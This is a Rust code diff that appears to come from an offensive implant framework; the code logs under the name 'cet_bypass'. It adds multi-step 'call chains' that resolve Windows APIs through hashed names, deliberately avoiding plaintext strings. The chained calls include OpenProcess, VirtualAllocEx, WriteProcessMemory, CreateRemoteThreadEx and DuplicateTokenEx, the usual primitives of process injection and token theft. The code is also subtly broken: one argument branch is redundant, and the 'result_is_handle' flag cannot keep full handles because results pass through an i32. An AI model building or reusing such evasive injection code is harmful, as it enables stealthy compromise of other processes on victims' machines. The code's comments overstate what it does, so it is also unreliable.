@@ -775,6 +775,16 @@ pub struct CallChainStep {
     /// Number of arguments the kernel32 wrapper expects.
     /// Used to select the correct transmute signature.
     pub arg_count: usize,
+    /// In multi-step chains, if true, pass the original caller args to this
+    /// step instead of the forwarded result from the previous step.
+    /// Defaults to false for backward compatibility with single-step chains.
+    pub pass_through: bool,
+    /// In multi-step chains, offset into the caller's args to start reading.
+    /// Defaults to 0 (all args passed).  Allows skipping forwarded args.
+    pub args_offset: Option<u32>,
+    /// If true, the return value is a handle/pointer (preserve full u64 range).
+    /// If false (default), only the lower 32 bits are forwarded.
+    pub result_is_handle: bool,
 }
 
 // ─── Pre-computed DLL wide-string hashes ────────────────────────────────────
@@ -841,6 +851,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_WRITEPROCESSMEMORY,
             arg_count: 5,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: false,
         }],
     );
 
@@ -850,6 +863,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_READPROCESSMEMORY,
             arg_count: 5,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: false,
         }],
     );
 
@@ -859,6 +875,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_VIRTUALALLOCEX,
             arg_count: 5,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: true,
         }],
     );
 
@@ -868,6 +887,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_VIRTUALFREEEX,
             arg_count: 4,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: false,
         }],
     );
 
@@ -877,6 +899,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_VIRTUALPROTECTEX,
             arg_count: 5,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: false,
         }],
     );
 
@@ -886,6 +911,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_OPENPROCESS,
             arg_count: 3,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: true,
         }],
     );
 
@@ -895,6 +923,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_CLOSEHANDLE,
             arg_count: 1,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: false,
         }],
     );
 
@@ -904,6 +935,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_VIRTUALQUERYEX,
             arg_count: 4,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: false,
         }],
     );
 
@@ -913,6 +947,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: KERNEL32_DLL_HASH,
             func_hash: HASH_CREATEREMOTETHREADEX,
             arg_count: 6,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: true,
         }],
     );
 
@@ -922,6 +959,9 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
             dll_hash: ADVAPI32_DLL_HASH,
             func_hash: HASH_DUPLICATETOKENEX,
             arg_count: 5,
+            pass_through: false,
+            args_offset: None,
+            result_is_handle: true,
         }],
     );
 
@@ -945,15 +985,83 @@ pub static CALL_CHAINS: once_cell::sync::Lazy<
 pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
     let chain = CALL_CHAINS.get(func_name)?;
 
-    if chain.len() != 1 {
-        log::warn!(
-            "cet_bypass: multi-step call chains not yet supported for {}",
-            func_name
-        );
-        return None;
+    // ── Single-step chain (common case) ──────────────────────────────────
+    // Direct call to the kernel32/advapi32 equivalent.
+    if chain.len() == 1 {
+        return call_single_step(&chain[0], args);
     }
 
-    let step = &chain[0];
+    // ── Multi-step chain ─────────────────────────────────────────────────
+    // Executes each step in sequence.  The result of each intermediate step
+    // is passed as the first argument to the next step (output-forwarding
+    // chain).  The return value of the final step is returned to the caller.
+    //
+    // This pattern supports call chains like:
+    //   NtXxx → kernel32.OpenProcess → kernel32.SomeOperation → kernel32.CloseHandle
+    // where intermediate results (handles, pointers) flow forward.
+    //
+    // If a step specifies `pass_through == true`, the original args are used
+    // instead of the forwarded result, allowing side-effect-only intermediate
+    // steps (e.g. duplicate a handle, then operate on the original args).
+
+    let mut forward_value: u64 = 0;
+    let mut forward_valid = false;
+
+    for (i, step) in chain.iter().enumerate() {
+        let is_last = i == chain.len() - 1;
+
+        let call_args = if step.pass_through {
+            // Use original caller-provided arguments.
+            args
+        } else if forward_valid {
+            // Use forwarded result as first arg, rest from caller.
+            &args
+        } else {
+            args
+        };
+
+        // Build the actual argument list for this step.
+        let effective_args = if forward_valid && !step.pass_through {
+            // Prepend forwarded value to the step's remaining args.
+            let step_args_start = step.args_offset.unwrap_or(0) as usize;
+            let mut combined = vec![forward_value];
+            for j in step_args_start..call_args.len() {
+                combined.push(call_args[j]);
+            }
+            combined
+        } else {
+            let step_args_start = step.args_offset.unwrap_or(0) as usize;
+            if step_args_start > 0 && step_args_start < call_args.len() {
+                call_args[step_args_start..].to_vec()
+            } else {
+                call_args.to_vec()
+            }
+        };
+
+        let result = call_single_step(step, &effective_args)?;
+
+        if is_last {
+            return Some(result);
+        } else {
+            // Forward the result to the next step.
+            // For functions returning BOOL (0 = failure), treat the return
+            // value as a handle/pointer that may be 0 on failure.
+            forward_value = if step.result_is_handle {
+                result as u64
+            } else {
+                (result as u64) & 0xFFFFFFFF // NTSTATUS or BOOL → u32
+            };
+            forward_valid = true;
+        }
+    }
+
+    // Unreachable if chain is non-empty, but satisfy the type checker.
+    None
+}
+
+/// Execute a single call chain step by resolving the function and
+/// dispatching with the correct arity.
+fn call_single_step(step: &CallChainStep, args: &[u64]) -> Option<i32> {
 
     // Resolve the DLL base and function address directly from the
     // pre-computed hashes.  No plaintext strings involved.
